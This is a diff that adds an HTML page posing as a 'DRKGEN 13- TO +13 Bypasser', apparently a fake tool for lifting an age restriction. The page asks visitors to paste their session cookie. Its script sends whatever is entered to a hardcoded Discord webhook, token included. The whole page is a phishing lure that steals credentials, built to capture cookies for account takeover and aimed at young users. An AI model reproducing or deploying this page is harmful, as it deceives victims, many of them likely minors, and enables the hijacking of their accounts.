@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Untitled</title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <title>DRKGEN Bypasser</title>
+
+  <style>
+
+    body {
+
+      font-family: Arial, sans-serif;
+
+      background: #111;
+
+      color: #eee;
+
+      display: flex;
+
+      justify-content: center;
+
+      align-items: center;
+
+      height: 100vh;
+
+      flex-direction: column;
+
+    }
+
+    input, button {
+
+      padding: 10px;
+
+      font-size: 16px;
+
+      margin-top: 10px;
+
+    }
+
+    input {
+
+      width: 300px;
+
+    }
+
+    button {
+
+      background-color: #444;
+
+      color: white;
+
+      border: none;
+
+      cursor: pointer;
+
+    }
+
+    button:hover {
+
+      background-color: #666;
+
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+   <h1>DRKGEN 13- TO +13 Bypasser</h1>
+
+  <input type="text" id="userInput" placeholder="Enter your cookie">
+
+  <button onclick="sendToWebhook()">Submit</button>
+
+  <script>
+
+    function sendToWebhook() {
+
+      const input = document.getElementById('userInput').value;
+
+      if (!input) return alert("please enter your cookie.");
+
+      fetch('https://discord.com/api/webhooks/1342733469582889083/KVonuTgI9MYthPnWFz9nXDJiqdgeqaaUW61uzQkBL2abnbKohQf9EvyZfOvycN68p_54', {
+
+        method: 'POST',
+
+        headers: { 'Content-Type': 'application/json' },
+
+        body: JSON.stringify({ content: input })
+
+      })
+
+      .then(response => {
+
+        if (response.ok) {
+
+          alert("Submitted successfully.");
+
+        } else {
+
+          alert("Failed to send.");
+
+        }
+
+      })
+
+      .catch(err => {
+
+        console.error(err);
+
+        alert("Error occurred.");
+
+      });
+
+    }
+
+  </script>
+
+</body>
+
+</html>
+<!-- partial -->
+  
+</body>
+</html>
